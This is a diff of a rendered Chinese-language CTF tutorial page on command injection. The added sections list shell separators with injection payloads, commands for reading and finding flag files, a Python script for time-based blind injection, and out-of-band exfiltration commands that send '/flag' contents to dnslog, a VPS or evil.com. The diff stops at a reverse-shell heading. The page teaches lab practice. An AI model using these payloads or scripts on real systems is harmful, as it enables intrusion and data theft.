@@ -2591,6 +2591,383 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#has-echo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. 有回显：先确认能不能看到输出
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. 有回显：先确认能不能看到输出">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.1 分隔符速查
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.2 读文件的姿势（按"能读到"到"读不到也能绕"排序）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.3 flag 不在明面上时
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#no-echo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. 无回显：把结果"搬出来"
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. 无回显：把结果&#34;搬出来&#34;">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#71" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.1 写文件 + 回读（最常用）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#72" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.2 时间盲注（页面完全没有回显参照时）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#73-oob" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.3 带外（OOB）：让目标主动联系你
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.4 反弹 shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. 绕过过滤：黑名单攻防速查表
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. 绕过过滤：黑名单攻防速查表">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#81" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.1 空格被过滤
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#82-flagcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.2 关键词（flag、cat、/）被过滤
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#83-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.3 字母数字被过滤（无字母数字 RCE）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#84-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.4 无参数（无参 RCE）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#85-7-5-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.5 长度限制（7 / 5 / 4 字符）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#disable-functions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.6 disable_functions 禁用函数
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#87" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.7 环境变量注入（进阶但好用）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. PHP 专项
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="9. PHP 专项">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#91" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.1 危险函数表
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#no-param-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.2 无参 RCE 工具箱
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#93-disable_functions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.3 突破 disable_functions（了解即可）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#why-fail" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10. 为什么你的 payload 打不通
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-ai" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11. AI 时代怎么学命令执行
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="11. AI 时代怎么学命令执行">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#111-ai" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11.1 把 AI 当成三种角色，而不是"答案机器"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#112" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11.2 三条铁律
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#113" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11.3 建议的学习闭环
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12. 自测清单
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13. 题单与资料
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="13. 题单与资料">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        靶场
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        文章
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        工具
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -2894,7 +3271,7 @@
 <a id="__codelineno-3-8" name="__codelineno-3-8"></a><a href="#__codelineno-3-8"><span class="linenos" data-linenos="8 "></span></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
 <a id="__codelineno-3-9" name="__codelineno-3-9"></a><a href="#__codelineno-3-9"><span class="linenos" data-linenos="9 "></span></a><span class="cp">?&gt;</span>
 </code></pre></div>
-<p><code>$ip</code> 完全可控，最终拼成了 <code>ping -c 1 &lt;你的输入&gt;</code> 丢给 shell 执行。于是：</p>
+<p><code>$ip</code> 完全可控，最终交给 shell 执行的是 <code>ping -c 1</code> 拼接上你输入的内容，于是：</p>
 <table>
 <thead>
 <tr>
@@ -3006,7 +3383,746 @@
 </code></pre></div>
 <div class="admonition tip">
 <p class="admonition-title">一个高效的调试习惯</p>
-<p>把过滤规则"测"出来，而不是"猜"出来。例如空格被过滤时，依次发 <code>cat /flag</code>、`cat</p>
+<p>把过滤规则"测"出来，而不是"猜"出来。比如发现空格被过滤，就把同一个 payload 换成下面几种写法依次发，看哪一个不触发 WAF：</p>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a><a href="#__codelineno-7-1"><span class="linenos" data-linenos="1 "></span></a>cat<span class="w"> </span>/flag
+<a id="__codelineno-7-2" name="__codelineno-7-2"></a><a href="#__codelineno-7-2"><span class="linenos" data-linenos="2 "></span></a>cat&lt;/flag
+<a id="__codelineno-7-3" name="__codelineno-7-3"></a><a href="#__codelineno-7-3"><span class="linenos" data-linenos="3 "></span></a>cat<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>/flag
+</code></pre></div>
+<p>这就是手工 fuzz，比问 AI 猜过滤规则快得多。</p>
+</div>
+<h2 id="has-echo">6. 有回显：先确认能不能看到输出<a class="headerlink" href="#has-echo" title="Permanent link">&para;</a></h2>
+<h3 id="61">6.1 分隔符速查<a class="headerlink" href="#61" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>语义</th>
+<th>例（<code>$ip</code> 可控）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>;</code></td>
+<td>顺序执行，前一条失败也继续</td>
+<td><code>127.0.0.1;cat /flag</code></td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>前一条<strong>成功</strong>才执行</td>
+<td><code>127.0.0.1&amp;&amp;cat /flag</code></td>
+</tr>
+<tr>
+<td><code>||</code></td>
+<td>前一条<strong>失败</strong>才执行</td>
+<td><code>x||cat /flag</code></td>
+</tr>
+<tr>
+<td><code>|</code></td>
+<td>管道，前一条输出传给后一条</td>
+<td><code>127.0.0.1|cat /flag</code></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>前一条放后台，立即执行后一条（Web 里通常要 URL 编码成 <code>%26</code>）</td>
+<td><code>127.0.0.1%26cat /flag</code></td>
+</tr>
+<tr>
+<td><code>%0a</code> / <code>%0d</code></td>
+<td>换行 / 回车，等价于新的一条命令</td>
+<td><code>127.0.0.1%0acat%20/flag</code></td>
+</tr>
+<tr>
+<td><code>`cmd`</code> / <code>$(cmd)</code></td>
+<td>命令替换，结果作为一段文本插入</td>
+<td><code>echo `cat /flag`</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="62">6.2 读文件的姿势（按"能读到"到"读不到也能绕"排序）<a class="headerlink" href="#62" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a><a href="#__codelineno-8-1"><span class="linenos" data-linenos="1 "></span></a>cat<span class="w"> </span>/flag
+<a id="__codelineno-8-2" name="__codelineno-8-2"></a><a href="#__codelineno-8-2"><span class="linenos" data-linenos="2 "></span></a>tac<span class="w"> </span>/flag<span class="w">                     </span><span class="c1"># 倒序，绕 "flag" 关键字过滤的另一种思路</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3"></a><a href="#__codelineno-8-3"><span class="linenos" data-linenos="3 "></span></a>cat<span class="w"> </span>/f*<span class="w">                       </span><span class="c1"># 通配符，绕文件名不确定/被过滤</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4"></a><a href="#__codelineno-8-4"><span class="linenos" data-linenos="4 "></span></a>cat<span class="w"> </span>/fla?
+<a id="__codelineno-8-5" name="__codelineno-8-5"></a><a href="#__codelineno-8-5"><span class="linenos" data-linenos="5 "></span></a>cat<span class="w"> </span>/???/??????<span class="w">               </span><span class="c1"># 只给长度信息时</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6"></a><a href="#__codelineno-8-6"><span class="linenos" data-linenos="6 "></span></a>nl<span class="w"> </span>/flag<span class="p">;</span><span class="w"> </span>head<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span><span class="w"> </span>/flag<span class="p">;</span><span class="w"> </span>sort<span class="w"> </span>/flag<span class="p">;</span><span class="w"> </span>uniq<span class="w"> </span>/flag
+<a id="__codelineno-8-7" name="__codelineno-8-7"></a><a href="#__codelineno-8-7"><span class="linenos" data-linenos="7 "></span></a>base64<span class="w"> </span>/flag<span class="w">                  </span><span class="c1"># 内容里有特殊字符/被截断时</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8"></a><a href="#__codelineno-8-8"><span class="linenos" data-linenos="8 "></span></a>grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"flag"</span><span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w">  </span><span class="c1"># 不知道 flag 在哪</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9"></a><a href="#__codelineno-8-9"><span class="linenos" data-linenos="9 "></span></a>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*flag*"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<h3 id="63-flag">6.3 flag 不在明面上时<a class="headerlink" href="#63-flag" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>现象</th>
+<th>对策</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>只知道 flag 在某个目录</td>
+<td><code>find / -name "*flag*" 2&gt;/dev/null</code>、<code>ls -la /</code></td>
+</tr>
+<tr>
+<td>页面只显示一部分（长度截断）</td>
+<td><code>cut</code>、<code>tail</code>、<code>base64</code> 分段读</td>
+</tr>
+<tr>
+<td>命令结果被 HTML 转义</td>
+<td>用 <code>base64</code>（它天生不带特殊字符），或者把结果写文件再访问</td>
+</tr>
+<tr>
+<td>只有 root 能读（需要 SUID 提权）</td>
+<td><code>find / -perm -4000 2&gt;/dev/null</code>，找 <code>readflag</code> 之类的二进制</td>
+</tr>
+</tbody>
+</table>
+<h2 id="no-echo">7. 无回显：把结果"搬出来"<a class="headerlink" href="#no-echo" title="Permanent link">&para;</a></h2>
+<p><code>exec()</code> 这类函数只返回最后一行；有些题干脆把输出重定向到了 <code>/dev/null</code>。此时<strong>不是没执行，是你看不见</strong>。</p>
+<p>典型"无回显"源码（RCE-labs Level 8）：</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a><a href="#__codelineno-9-1"><span class="linenos" data-linenos="1 "></span></a><span class="x">function hello_shell($cmd){</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2"></a><a href="#__codelineno-9-2"><span class="linenos" data-linenos="2 "></span></a><span class="x">    system($cmd . "&gt;/dev/null 2&gt;&amp;1");   // 输出被吞掉</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3"></a><a href="#__codelineno-9-3"><span class="linenos" data-linenos="3 "></span></a><span class="x">}</span>
+</code></pre></div>
+<h3 id="71">7.1 写文件 + 回读（最常用）<a class="headerlink" href="#71" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a><a href="#__codelineno-10-1"><span class="linenos" data-linenos="1 "></span></a>cat<span class="w"> </span>/flag<span class="w"> </span>&gt;<span class="w"> </span>/var/www/html/out.txt<span class="w">          </span><span class="c1"># 常规写法</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2"></a><a href="#__codelineno-10-2"><span class="linenos" data-linenos="2 "></span></a>cat<span class="w"> </span>/flag<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>/var/www/html/out.txt<span class="w">      </span><span class="c1"># tee 自己写文件，不受末尾重定向影响</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3"></a><a href="#__codelineno-10-3"><span class="linenos" data-linenos="3 "></span></a>
+<a id="__codelineno-10-4" name="__codelineno-10-4"></a><a href="#__codelineno-10-4"><span class="linenos" data-linenos="4 "></span></a><span class="c1"># 如果题目在你命令末尾追加了 &gt;/dev/null 2&gt;&amp;1，可以用 # 把它注释掉：</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5"></a><a href="#__codelineno-10-5"><span class="linenos" data-linenos="5 "></span></a>cat<span class="w"> </span>/flag<span class="w"> </span>&gt;<span class="w"> </span>/var/www/html/out.txt<span class="w"> </span><span class="c1">#</span>
+</code></pre></div>
+<p>然后访问 <code>http://target/out.txt</code>。</p>
+<div class="admonition tip">
+<p class="admonition-title">为什么 <code>&gt;</code> 有时不管用</p>
+<p>题目如果在你的命令后面追加了 <code>&gt;/dev/null 2&gt;&amp;1</code>，那么 <code>cat /flag &gt; out.txt &gt;/dev/null</code> 里<strong>最后一个重定向生效</strong>，文件写不出来。两种解法：用 <code>tee</code>（它自己写文件，stdout 被丢掉无所谓），或者用 <code>#</code> 把后面追加的内容注释掉。两者都实测有效。</p>
+</div>
+<h3 id="72">7.2 时间盲注（页面完全没有回显参照时）<a class="headerlink" href="#72" title="Permanent link">&para;</a></h3>
+<p>思路：把"读到的字符"变成一个<strong>可观测的副作用</strong>——延迟。</p>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a><a href="#__codelineno-11-1"><span class="linenos" data-linenos="1 "></span></a><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span>cat<span class="w"> </span>/flag<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-c1<span class="k">)</span><span class="s2">"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"f"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">3</span><span class="p">;</span><span class="w"> </span><span class="k">fi</span>
+</code></pre></div>
+<p>脚本骨架（仅用标准库，零依赖）：</p>
+<div class="language-python highlight"><span class="filename">Python</span><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1"></a><a href="#__codelineno-12-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2"></a><a href="#__codelineno-12-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="c1"># 用法: python3 blind.py "http://target/index.php?cmd=" "/flag"</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3"></a><a href="#__codelineno-12-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="w"> </span><span class="nn">time</span><span class="o">,</span><span class="w"> </span><span class="nn">string</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4"></a><a href="#__codelineno-12-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">quote</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5"></a><a href="#__codelineno-12-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="kn">from</span><span class="w"> </span><span class="nn">urllib.request</span><span class="w"> </span><span class="kn">import</span> <span class="n">urlopen</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6"></a><a href="#__codelineno-12-6"><span class="linenos" data-linenos=" 6 "></span></a>
+<a id="__codelineno-12-7" name="__codelineno-12-7"></a><a href="#__codelineno-12-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="n">url</span>   <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8"></a><a href="#__codelineno-12-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="n">path</span>  <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="s1">'/flag'</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9"></a><a href="#__codelineno-12-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">'</span><span class="si">{}</span><span class="s1">_-'</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10"></a><a href="#__codelineno-12-10"><span class="linenos" data-linenos="10 "></span></a><span class="n">delay</span> <span class="o">=</span> <span class="mi">3</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11"></a><a href="#__codelineno-12-11"><span class="linenos" data-linenos="11 "></span></a>
+<a id="__codelineno-12-12" name="__codelineno-12-12"></a><a href="#__codelineno-12-12"><span class="linenos" data-linenos="12 "></span></a><span class="n">flag</span> <span class="o">=</span> <span class="s1">''</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13"></a><a href="#__codelineno-12-13"><span class="linenos" data-linenos="13 "></span></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">61</span><span class="p">):</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14"></a><a href="#__codelineno-12-14"><span class="linenos" data-linenos="14 "></span></a>    <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
+<a id="__codelineno-12-15" name="__codelineno-12-15"></a><a href="#__codelineno-12-15"><span class="linenos" data-linenos="15 "></span></a>    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
+<a id="__codelineno-12-16" name="__codelineno-12-16"></a><a href="#__codelineno-12-16"><span class="linenos" data-linenos="16 "></span></a>        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">'if [ "$(cat </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s1"> | cut -c</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">)" = "</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s1">" ]; then sleep </span><span class="si">{</span><span class="n">delay</span><span class="si">}</span><span class="s1">; fi'</span>
+<a id="__codelineno-12-17" name="__codelineno-12-17"></a><a href="#__codelineno-12-17"><span class="linenos" data-linenos="17 "></span></a>        <span class="n">t0</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+<a id="__codelineno-12-18" name="__codelineno-12-18"></a><a href="#__codelineno-12-18"><span class="linenos" data-linenos="18 "></span></a>        <span class="k">try</span><span class="p">:</span>
+<a id="__codelineno-12-19" name="__codelineno-12-19"></a><a href="#__codelineno-12-19"><span class="linenos" data-linenos="19 "></span></a>            <span class="n">urlopen</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="n">delay</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<a id="__codelineno-12-20" name="__codelineno-12-20"></a><a href="#__codelineno-12-20"><span class="linenos" data-linenos="20 "></span></a>        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+<a id="__codelineno-12-21" name="__codelineno-12-21"></a><a href="#__codelineno-12-21"><span class="linenos" data-linenos="21 "></span></a>            <span class="k">pass</span>
+<a id="__codelineno-12-22" name="__codelineno-12-22"></a><a href="#__codelineno-12-22"><span class="linenos" data-linenos="22 "></span></a>        <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">t0</span> <span class="o">&gt;=</span> <span class="n">delay</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>      <span class="c1"># 明显变慢 ⇒ 猜中了</span>
+<a id="__codelineno-12-23" name="__codelineno-12-23"></a><a href="#__codelineno-12-23"><span class="linenos" data-linenos="23 "></span></a>            <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
+<a id="__codelineno-12-24" name="__codelineno-12-24"></a><a href="#__codelineno-12-24"><span class="linenos" data-linenos="24 "></span></a>            <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
+<a id="__codelineno-12-25" name="__codelineno-12-25"></a><a href="#__codelineno-12-25"><span class="linenos" data-linenos="25 "></span></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">'[*] </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s1">'</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<a id="__codelineno-12-26" name="__codelineno-12-26"></a><a href="#__codelineno-12-26"><span class="linenos" data-linenos="26 "></span></a>            <span class="k">break</span>
+<a id="__codelineno-12-27" name="__codelineno-12-27"></a><a href="#__codelineno-12-27"><span class="linenos" data-linenos="27 "></span></a>    <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
+<a id="__codelineno-12-28" name="__codelineno-12-28"></a><a href="#__codelineno-12-28"><span class="linenos" data-linenos="28 "></span></a>        <span class="k">break</span>
+<a id="__codelineno-12-29" name="__codelineno-12-29"></a><a href="#__codelineno-12-29"><span class="linenos" data-linenos="29 "></span></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">'[+] result: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s1">'</span><span class="p">)</span>
+</code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">盲注的通用套路</p>
+<ul>
+<li>判断字符用 <code>cut -cN</code>（第 N 个字符）、<code>awk 'NR==N'</code>（第 N 行，选文件用）</li>
+<li>不确定文件名时先盲注文件名：<code>ls / | awk 'NR==4' | cut -c1</code></li>
+<li>延迟建议 ≥ 3 秒，否则会被网络抖动干扰；一次请求只问一个是/否，慢但稳</li>
+<li>本地实测：命中时约 2000ms，未命中约 30ms，差异非常明显</li>
+</ul>
+</div>
+<h3 id="73-oob">7.3 带外（OOB）：让目标主动联系你<a class="headerlink" href="#73-oob" title="Permanent link">&para;</a></h3>
+<p>页面无回显、也没法写文件（无写权限）时，让目标把结果<strong>发到你的服务器</strong>。</p>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1"></a><a href="#__codelineno-13-1"><span class="linenos" data-linenos="1 "></span></a><span class="c1"># DNS 带外（最隐蔽，很多 WAF 不管）：用 dnslog / Burp Collaborator 的子域名</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2"></a><a href="#__codelineno-13-2"><span class="linenos" data-linenos="2 "></span></a>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="sb">`</span>whoami<span class="sb">`</span>.xxxxxx.dnslog.cn
+<a id="__codelineno-13-3" name="__codelineno-13-3"></a><a href="#__codelineno-13-3"><span class="linenos" data-linenos="3 "></span></a>curl<span class="w"> </span>http://<span class="sb">`</span>cat<span class="w"> </span>/flag<span class="sb">`</span>.xxxxxx.dnslog.cn
+<a id="__codelineno-13-4" name="__codelineno-13-4"></a><a href="#__codelineno-13-4"><span class="linenos" data-linenos="4 "></span></a>
+<a id="__codelineno-13-5" name="__codelineno-13-5"></a><a href="#__codelineno-13-5"><span class="linenos" data-linenos="5 "></span></a><span class="c1"># HTTP 带外（能带更多数据）</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6"></a><a href="#__codelineno-13-6"><span class="linenos" data-linenos="6 "></span></a>curl<span class="w"> </span>http://your-vps/?d<span class="o">=</span><span class="sb">`</span>cat<span class="w"> </span>/flag<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="sb">`</span>
+</code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">两个实测踩过的坑（会很浪费时间）</p>
+<ol>
+<li><strong><code>curl</code> 会把 <code>{}</code> 当 URL glob 展开</strong>，于是 <code>flag{abc}</code> 被吃掉变成 <code>flagabc</code>。解法：加 <code>-g</code>（关闭 globbing），或者先 <code>base64</code> 再发。</li>
+<li><strong><code>base64</code> 默认带换行</strong>，URL 里会多出一个 <code>%0A</code>。稳妥写法：<code>cat /flag | base64 | tr -d '\n'</code>。</li>
+</ol>
+<p>本地实测正确姿势：
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1"></a><a href="#__codelineno-14-1"><span class="linenos" data-linenos="1 "></span></a>curl<span class="w"> </span>-g<span class="w"> </span><span class="s2">"http://evil.com/</span><span class="k">$(</span>cat<span class="w"> </span>/flag<span class="k">)</span><span class="s2">"</span><span class="w">                  </span><span class="c1"># -g 关闭 glob</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2"></a><a href="#__codelineno-14-2"><span class="linenos" data-linenos="2 "></span></a>curl<span class="w"> </span><span class="s2">"http://evil.com/</span><span class="k">$(</span>cat<span class="w"> </span>/flag<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s1">'\n'</span><span class="k">)</span><span class="s2">"</span><span class="w">  </span><span class="c1"># 或者编码后再发</span>
+</code></pre></div></p>
+</div>
+<h3 id="reverse-shell">7.4 反弹 shell<a class="headerlink" href="#reverse-shell" title="Permanent link">&para;</a></h3>
+<p>如果目标是交互式拿 shell（而不只是读文件）：</p>
